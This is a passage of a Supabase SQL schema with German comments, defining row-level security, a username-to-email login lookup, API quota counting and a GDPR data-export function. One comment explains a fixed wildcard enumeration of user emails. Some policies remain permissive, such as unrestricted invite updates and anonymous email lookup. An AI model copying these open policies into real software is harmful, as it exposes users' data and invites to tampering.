  from_user   uuid NOT NULL REFERENCES profiles(id) ON DELETE CASCADE,
  text        text,
  created_at  timestamptz DEFAULT now(),
  UNIQUE (group_id, from_user)
);
ALTER TABLE group_join_requests ENABLE ROW LEVEL SECURITY;
CREATE POLICY "gjr_select" ON group_join_requests FOR SELECT
  USING (from_user = auth.uid() OR EXISTS (
    SELECT 1 FROM group_members WHERE group_id = group_join_requests.group_id
    AND user_id = auth.uid() AND role IN ('owner','mod')
  ));
CREATE POLICY "gjr_insert" ON group_join_requests FOR INSERT WITH CHECK (from_user = auth.uid());
CREATE POLICY "gjr_delete" ON group_join_requests FOR DELETE
  USING (from_user = auth.uid() OR EXISTS (
    SELECT 1 FROM group_members WHERE group_id = group_join_requests.group_id
    AND user_id = auth.uid() AND role IN ('owner','mod')
  ));

-- ── Invites ───────────────────────────────────────────────────────
CREATE TABLE IF NOT EXISTS invites (
  code        text PRIMARY KEY,
  group_id    uuid NOT NULL REFERENCES groups(id) ON DELETE CASCADE,
  created_by  uuid NOT NULL REFERENCES profiles(id) ON DELETE CASCADE,
  expires_at  timestamptz,
  max_uses    int,
  uses        int NOT NULL DEFAULT 0,
  created_at  timestamptz DEFAULT now()
);
ALTER TABLE invites ENABLE ROW LEVEL SECURITY;
CREATE POLICY "invites_select" ON invites FOR SELECT USING (true);
CREATE POLICY "invites_insert" ON invites FOR INSERT
  WITH CHECK (EXISTS (
    SELECT 1 FROM group_members WHERE group_id = invites.group_id
    AND user_id = auth.uid() AND role IN ('owner','mod')
  ));
CREATE POLICY "invites_update" ON invites FOR UPDATE USING (true);
CREATE POLICY "invites_delete" ON invites FOR DELETE
  USING (created_by = auth.uid() OR EXISTS (
    SELECT 1 FROM group_members WHERE group_id = invites.group_id
    AND user_id = auth.uid() AND role IN ('owner','mod')
  ));

-- ── Message reports ───────────────────────────────────────────────
CREATE TABLE IF NOT EXISTS message_reports (
  id          uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  message_id  uuid NOT NULL REFERENCES messages(id) ON DELETE CASCADE,
  group_id    uuid REFERENCES groups(id) ON DELETE CASCADE,
  reported_by uuid NOT NULL REFERENCES profiles(id) ON DELETE CASCADE,
  reason      text,
  created_at  timestamptz DEFAULT now()
);
ALTER TABLE message_reports ENABLE ROW LEVEL SECURITY;
CREATE POLICY "mreports_insert" ON message_reports FOR INSERT WITH CHECK (reported_by = auth.uid());
CREATE POLICY "mreports_select" ON message_reports FOR SELECT
  USING (reported_by = auth.uid() OR EXISTS (
    SELECT 1 FROM group_members WHERE group_id = message_reports.group_id
    AND user_id = auth.uid() AND role IN ('owner','mod')
  ));

-- ── User reports ──────────────────────────────────────────────────
CREATE TABLE IF NOT EXISTS user_reports (
  id          uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  from_user   uuid NOT NULL REFERENCES profiles(id) ON DELETE CASCADE,
  reported    uuid NOT NULL REFERENCES profiles(id) ON DELETE CASCADE,
  reason      text,
  text        text,
  status      text DEFAULT 'open',
  created_at  timestamptz DEFAULT now()
);
ALTER TABLE user_reports ENABLE ROW LEVEL SECURITY;
CREATE POLICY "ureports_insert" ON user_reports FOR INSERT WITH CHECK (from_user = auth.uid());
CREATE POLICY "ureports_select" ON user_reports FOR SELECT USING (from_user = auth.uid());

-- ── Group bans (separate from members) ───────────────────────────
CREATE TABLE IF NOT EXISTS group_bans (
  id        bigserial PRIMARY KEY,
  group_id  uuid NOT NULL REFERENCES groups(id) ON DELETE CASCADE,
  user_id   uuid NOT NULL REFERENCES profiles(id) ON DELETE CASCADE,
  banned_by uuid NOT NULL REFERENCES profiles(id) ON DELETE CASCADE,
  banned_at timestamptz DEFAULT now(),
  UNIQUE (group_id, user_id)
);
ALTER TABLE group_bans ENABLE ROW LEVEL SECURITY;
CREATE POLICY "gbans_select" ON group_bans FOR SELECT
  USING (user_id = auth.uid() OR EXISTS (
    SELECT 1 FROM group_members WHERE group_id = group_bans.group_id
    AND user_id = auth.uid() AND role IN ('owner','mod')
  ));
CREATE POLICY "gbans_insert" ON group_bans FOR INSERT
  WITH CHECK (EXISTS (
    SELECT 1 FROM group_members WHERE group_id = group_bans.group_id
    AND user_id = auth.uid() AND role IN ('owner','mod')
  ));
CREATE POLICY "gbans_delete" ON group_bans FOR DELETE
  USING (EXISTS (
    SELECT 1 FROM group_members WHERE group_id = group_bans.group_id
    AND user_id = auth.uid() AND role IN ('owner','mod')
  ));

-- ── Login per Benutzername ────────────────────────────────────────
-- profiles enthält keine E-Mail-Spalte (die liegt in auth.users, per RLS
-- nicht direkt abfragbar). Für den Login-Flow "Benutzername ODER E-Mail"
-- braucht das Frontend die zugehörige E-Mail zu einem Benutzernamen —
-- SECURITY DEFINER erlaubt genau diesen einen kontrollierten Lesezugriff.
--
-- SICHERHEIT: Vergleich MUSS exakt sein. Mit `ILIKE` war uname ein
-- Pattern: ein anonymer Aufruf mit '%' lieferte eine beliebige fremde
-- E-Mail, 'a%'/'b%'/… klappern den Bestand ab. Die Funktion ist an anon
-- freigegeben und der Anon-Key steht im Client-Bundle — der Aufruf ist
-- also für jeden möglich. Das GRANT bleibt (der Login-Bildschirm braucht
-- die Funktion vor der Anmeldung), der Schutz liegt im exakten Match.
CREATE OR REPLACE FUNCTION email_for_username(uname text)
RETURNS text
LANGUAGE sql
SECURITY DEFINER
SET search_path = public
AS $$
  SELECT au.email
  FROM auth.users au
  JOIN profiles p ON p.id = au.id
  WHERE lower(p.username) = lower(uname)
  LIMIT 1
$$;
REVOKE ALL ON FUNCTION email_for_username(text) FROM PUBLIC;
GRANT EXECUTE ON FUNCTION email_for_username(text) TO anon, authenticated;

-- ── Beta-Feedback ─────────────────────────────────────────────────
-- Niedrigschwelliger Kanal für Tester-Feedback (FAB rechts unten).
-- Kein SELECT-Policy: Feedback wird nur im Supabase-Dashboard gelesen
-- (Table Editor → beta_feedback → sort by created_at desc).
CREATE TABLE IF NOT EXISTS beta_feedback (
  id          uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id     uuid REFERENCES profiles(id) ON DELETE SET NULL,
  text        text NOT NULL,
  page        text,
  user_agent  text,
  created_at  timestamptz DEFAULT now()
);
ALTER TABLE beta_feedback ENABLE ROW LEVEL SECURITY;
CREATE POLICY "bf_insert_auth" ON beta_feedback FOR INSERT
  WITH CHECK (user_id = auth.uid() OR user_id IS NULL);

-- ── Push-Subscriptions (Web Push) ───────────────────────────────────
-- Ein Browser/Gerät pro Zeile (endpoint ist pro Browser-Installation
-- eindeutig). api/push-trigger.js liest diese Tabelle per Service-Role
-- (umgeht RLS bewusst, da es für beliebige Empfänger nachschlagen muss),
-- der Client selbst greift nur über seine eigene RLS-Sicht zu.
CREATE TABLE IF NOT EXISTS push_subscriptions (
  id         uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id    uuid NOT NULL REFERENCES profiles(id) ON DELETE CASCADE,
  endpoint   text NOT NULL UNIQUE,
  p256dh     text NOT NULL,
  auth       text NOT NULL,
  created_at timestamptz DEFAULT now()
);
ALTER TABLE push_subscriptions ENABLE ROW LEVEL SECURITY;
CREATE POLICY "push_sub_select" ON push_subscriptions FOR SELECT USING (user_id = auth.uid());
CREATE POLICY "push_sub_insert" ON push_subscriptions FOR INSERT WITH CHECK (user_id = auth.uid());
CREATE POLICY "push_sub_delete" ON push_subscriptions FOR DELETE USING (user_id = auth.uid());

-- ── Notification-Mutes (serverseitige Sicht auf lokale Mutes) ───────
-- Spiegelt community.js' isMuted()-Logik (localStorage mm_comm_mutes_v1,
-- Keys: Gruppen-ID oder 'dm/<username>') serverseitig, damit
-- api/push-trigger.js gemutete Chats nicht anstößt. until = NULL heißt
-- für immer gemutet, sonst Zeitpunkt bis zu dem gemutet ist.
CREATE TABLE IF NOT EXISTS notification_mutes (
  user_id   uuid NOT NULL REFERENCES profiles(id) ON DELETE CASCADE,
  mute_key  text NOT NULL,
  until     timestamptz,
  PRIMARY KEY (user_id, mute_key)
);
ALTER TABLE notification_mutes ENABLE ROW LEVEL SECURITY;
CREATE POLICY "notif_mutes_select" ON notification_mutes FOR SELECT USING (user_id = auth.uid());
CREATE POLICY "notif_mutes_upsert" ON notification_mutes FOR INSERT WITH CHECK (user_id = auth.uid());
CREATE POLICY "notif_mutes_update" ON notification_mutes FOR UPDATE USING (user_id = auth.uid());
CREATE POLICY "notif_mutes_delete" ON notification_mutes FOR DELETE USING (user_id = auth.uid());

-- ══════════════════════════════════════════════════════════════════
--  Realtime aktivieren (einmalig im Supabase-Dashboard unter
--  Database → Replication → Tables):
--  Tabellen: messages, friend_requests, group_members, message_reactions
--
--  message_reactions ist neu und MUSS mit aktiviert werden: Reaktionen laufen
--  nicht mehr als UPDATE auf messages durch, sondern als INSERT/DELETE hier.
--  Ohne den Haken sieht man fremde Reaktionen erst nach einem Neuladen —
--  die eigenen erscheinen weiterhin sofort (optimistisch).
-- ══════════════════════════════════════════════════════════════════

-- ── API-Kontingente (api_usage + bump_api_usage) ───────────────────
-- Ersetzt die Map im Modul-Scope von api/_shared.js als belastbare Grenze:
-- auf Vercel hat jede Lambda-Instanz ihren eigenen Speicher, Instanzen
-- skalieren hoch und starten kalt — ein In-Memory-Limit gilt damit pro
-- Instanz, nicht pro Nutzer. Dieser Zähler liegt in der Datenbank und gilt
-- über alle Instanzen und Neustarts hinweg.
--
-- Gezählt wird pro (Nutzer, Tag, Endpoint). `day` ist ein UTC-Datum, der
-- Tageswechsel liegt in Deutschland also um 01:00/02:00 Ortszeit — bewusst
-- so, damit die Grenze unabhängig von der Region der Instanz gleich fällt.
CREATE TABLE IF NOT EXISTS api_usage (
  user_id  uuid NOT NULL REFERENCES profiles(id) ON DELETE CASCADE,
  day      date NOT NULL DEFAULT (now() AT TIME ZONE 'utc')::date,
  endpoint text NOT NULL,
  count    int  NOT NULL DEFAULT 0,
  PRIMARY KEY (user_id, day, endpoint)
);
ALTER TABLE api_usage ENABLE ROW LEVEL SECURITY;
CREATE INDEX IF NOT EXISTS api_usage_day_idx ON api_usage (day);

-- BEWUSST KEINE POLICY. RLS ist an und es gibt keine Regel, die etwas
-- erlaubt — damit kommt kein Client direkt an die Tabelle, auch nicht an
-- die eigene Zeile. Genau das ist der Punkt: dürfte man seine eigene Zeile
-- schreiben oder löschen, wäre das Limit mit einem einzigen DELETE über die
-- REST-API zurückgesetzt. Der einzige Weg hinein führt über die Funktion
-- unten (SECURITY DEFINER läuft als Eigentümer und umgeht RLS).

-- Zählt einen Aufruf hoch und sagt, ob er noch im Kontingent liegt.
--
-- SICHERHEIT — der Nutzer kommt aus auth.uid(), NICHT aus einem Parameter.
-- Als Parameter könnte jeder Aufrufer eine fremde uid einsetzen und damit
-- entweder das Kontingent anderer aufbrauchen oder auf deren Kosten zählen.
-- auth.uid() liest die uid aus dem JWT der Anfrage und ist nicht fälschbar.
--
-- p_limit darf dagegen vom Aufrufer kommen: Die Funktion ist an
-- `authenticated` freigegeben, ein Nutzer kann sie also mit dem Anon-Key
-- direkt und mit beliebig hohem p_limit aufrufen — das erhöht aber nur
-- seinen eigenen Zähler und gibt ihm ein `true`, das niemand auswertet.
-- Maßgeblich ist allein der Aufruf aus api/_shared.js (checkDailyLimit) mit
-- dem echten Limit. Runterzählen kann die Funktion nicht; ein direkter
-- Aufruf schadet damit höchstens dem Aufrufer selbst.
CREATE OR REPLACE FUNCTION bump_api_usage(p_endpoint text, p_limit int)
RETURNS boolean
LANGUAGE plpgsql
SECURITY DEFINER
SET search_path = public
AS $$
DECLARE
  v_uid   uuid := auth.uid();
  v_count int;
BEGIN
  IF v_uid IS NULL OR p_endpoint IS NULL OR p_limit IS NULL OR p_limit <= 0 THEN
    RETURN false;
  END IF;

  -- INSERT ... ON CONFLICT DO UPDATE ist atomar (die Zeile ist während des
  -- Updates gesperrt) — zwei gleichzeitige Anfragen desselben Nutzers können
  -- sich hier nicht gegenseitig überschreiben.
  INSERT INTO api_usage (user_id, day, endpoint, count)
  VALUES (v_uid, (now() AT TIME ZONE 'utc')::date, p_endpoint, 1)
  ON CONFLICT (user_id, day, endpoint)
  DO UPDATE SET count = api_usage.count + 1
  RETURNING api_usage.count INTO v_count;

  RETURN v_count <= p_limit;
END;
$$;
-- REVOKE FROM PUBLIC allein reicht bei Supabase NICHT: das Projekt setzt
-- ALTER DEFAULT PRIVILEGES ... GRANT ALL ON FUNCTIONS TO anon, authenticated,
-- jede neue Funktion in `public` bekommt also einen EIGENEN Grant an anon.
-- Ein REVOKE gegen PUBLIC lässt den unberührt — nachgemessen: anon konnte
-- bump_api_usage aufrufen und bekam `false` statt einer Rechte-Verweigerung.
-- Folgenlos (ohne auth.uid() schreibt die Funktion nichts), aber der Aufruf
-- gehört anon trotzdem nicht.
REVOKE ALL ON FUNCTION bump_api_usage(text, int) FROM PUBLIC;
REVOKE ALL ON FUNCTION bump_api_usage(text, int) FROM anon;
GRANT EXECUTE ON FUNCTION bump_api_usage(text, int) TO authenticated;

-- Aufräumen (optional, alte Tageszeilen werden nie wieder gelesen).
-- Gelegentlich im SQL-Editor ausführen oder als pg_cron-Job einrichten:
--   DELETE FROM api_usage WHERE day < (now() AT TIME ZONE 'utc')::date - 30;


-- ══════════════════════════════════════════════════════════════════
--  DSGVO Art. 15 — Auskunft: export_my_data()
-- ══════════════════════════════════════════════════════════════════
-- Gibt alle Zeilen zum aufrufenden Nutzer als EIN jsonb-Objekt zurück.
-- Aufgerufen aus src/js/auth.js (exportMyData()), der Export-Knopf in
-- src/js/account.js legt anschließend die lokalen mm_*-Schlüssel dazu.
--
-- SICHERHEIT — der Nutzer kommt aus auth.uid(), NICHT aus einem Parameter.
-- Die Funktion hat bewusst gar keinen Parameter: SECURITY DEFINER umgeht RLS,
-- eine uid von außen wäre damit ein Auskunftsrecht über fremde Konten. Ohne
-- gültiges JWT ist auth.uid() NULL und die Funktion bricht ab.
--
-- ABGRENZUNG "nur eigene Daten" — bewusste Entscheidungen, nicht Auslassungen:
--   · messages: ausschließlich author_id = uid. Ein DM-Verlauf gehört auch dem
--     Gegenüber; exportiert werden nur die selbst geschriebenen Zeilen.
--   · blocks: nur blocker = uid (eigene Handlung). Zeilen mit blocked = uid
--     wären zwar über RLS sichtbar, würden aber offenlegen, wer den Nutzer
--     blockiert hat — fremde Schutzhandlung, Art. 15 Abs. 4.
--   · user_reports: nur from_user = uid (selbst abgegebene Meldungen). Wer den
--     Nutzer gemeldet hat, bleibt draußen, aus demselben Grund.
--   · friend_requests/friendships: beide Richtungen. Diese Zeilen zeigt die
--     App dem Nutzer ohnehin (eingehende Anfragen, Freundesliste) — der Export
--     legt hier nichts offen, was er nicht schon sieht.
--   · Fremde E-Mail-Adressen kommen nirgends vor: aus auth.users wird
--     ausschließlich die eigene Zeile gelesen.
--
-- Nicht enthalten, weil es keine personenbezogenen Daten des Nutzers sind:
-- groups/channels (Inhalte Dritter, gemeinschaftlich), api_usage (reiner
-- Kostenzähler), group_bans (Moderationsentscheidung der Gruppenleitung).
CREATE OR REPLACE FUNCTION export_my_data()
RETURNS jsonb
LANGUAGE plpgsql
SECURITY DEFINER
SET search_path = public
AS $$
DECLARE
  v_uid uuid := auth.uid();
BEGIN
  IF v_uid IS NULL THEN
    RAISE EXCEPTION 'export_my_data: not authenticated' USING ERRCODE = '28000';
  END IF;

  RETURN jsonb_build_object(
    'exported_at', now(),
    'user_id',     v_uid,

    -- Eigene Zeile aus auth.users. profiles hat keine E-Mail-Spalte, die
    -- Adresse gehört aber zur Auskunft. Bewusst nur diese vier Felder — nicht
    -- to_jsonb(au), das enthielte auch den Passwort-Hash und Tokens.
    'account', (
      SELECT to_jsonb(a) FROM (
        SELECT au.id, au.email, au.created_at, au.last_sign_in_at
        FROM auth.users au WHERE au.id = v_uid
      ) a
    ),

    'profile', (SELECT to_jsonb(p) FROM profiles p WHERE p.id = v_uid),

    'messages', COALESCE((
      SELECT jsonb_agg(to_jsonb(m) ORDER BY m.created_at)
      FROM messages m WHERE m.author_id = v_uid
    ), '[]'::jsonb),

    'group_members', COALESCE((
      SELECT jsonb_agg(to_jsonb(gm) ORDER BY gm.joined_at)
      FROM group_members gm WHERE gm.user_id = v_uid
    ), '[]'::jsonb),

    'friendships', COALESCE((
      SELECT jsonb_agg(to_jsonb(f) ORDER BY f.id)
      FROM friendships f WHERE f.user_a = v_uid OR f.user_b = v_uid
    ), '[]'::jsonb),

    'friend_requests', COALESCE((
      SELECT jsonb_agg(to_jsonb(fr) ORDER BY fr.created_at)
      FROM friend_requests fr WHERE fr.from_user = v_uid OR fr.to_user = v_uid
    ), '[]'::jsonb),

    'blocks', COALESCE((
      SELECT jsonb_agg(to_jsonb(b) ORDER BY b.id)
      FROM blocks b WHERE b.blocker = v_uid
    ), '[]'::jsonb),

    'ignores', COALESCE((
      SELECT jsonb_agg(to_jsonb(i) ORDER BY i.id)
      FROM ignores i WHERE i.ignorer = v_uid
    ), '[]'::jsonb),

    'group_rsvps', COALESCE((
      SELECT jsonb_agg(to_jsonb(r) ORDER BY r.created_at)
      FROM group_rsvps r WHERE r.user_id = v_uid
    ), '[]'::jsonb),

    'user_reports', COALESCE((
      SELECT jsonb_agg(to_jsonb(ur) ORDER BY ur.created_at)
      FROM user_reports ur WHERE ur.from_user = v_uid
    ), '[]'::jsonb),

    'message_reports', COALESCE((
      SELECT jsonb_agg(to_jsonb(mr) ORDER BY mr.created_at)
      FROM message_reports mr WHERE mr.reported_by = v_uid
    ), '[]'::jsonb),

    -- Eigene Reaktionen. Frueher steckten sie in messages.reactions und kamen
    -- damit nur im Export DESSEN mit, der die Nachricht geschrieben hat — die
    -- eigene Reaktion auf eine fremde Nachricht fehlte im eigenen Export.
    'message_reactions', COALESCE((
      SELECT jsonb_agg(to_jsonb(mrx) ORDER BY mrx.created_at)
      FROM message_reactions mrx WHERE mrx.user_id = v_uid
    ), '[]'::jsonb),

    'beta_feedback', COALESCE((
      SELECT jsonb_agg(to_jsonb(bf) ORDER BY bf.created_at)
      FROM beta_feedback bf WHERE bf.user_id = v_uid
    ), '[]'::jsonb),

    'push_subscriptions', COALESCE((
      SELECT jsonb_agg(to_jsonb(ps) ORDER BY ps.created_at)
      FROM push_subscriptions ps WHERE ps.user_id = v_uid
    ), '[]'::jsonb),

    'notification_mutes', COALESCE((
      SELECT jsonb_agg(to_jsonb(nm) ORDER BY nm.mute_key)
      FROM notification_mutes nm WHERE nm.user_id = v_uid
    ), '[]'::jsonb)
  );
END;
$$;
-- Wie bei bump_api_usage: REVOKE gegen PUBLIC allein reicht bei Supabase nicht,
-- das Projekt vergibt per ALTER DEFAULT PRIVILEGES einen eigenen Grant an anon.
-- Ohne das explizite REVOKE könnte anon die Funktion aufrufen — folgenlos
-- (auth.uid() ist dann NULL, die Funktion bricht ab), aber unnötig.
REVOKE ALL ON FUNCTION export_my_data() FROM PUBLIC;
REVOKE ALL ON FUNCTION export_my_data() FROM anon;
GRANT EXECUTE ON FUNCTION export_my_data() TO authenticated;
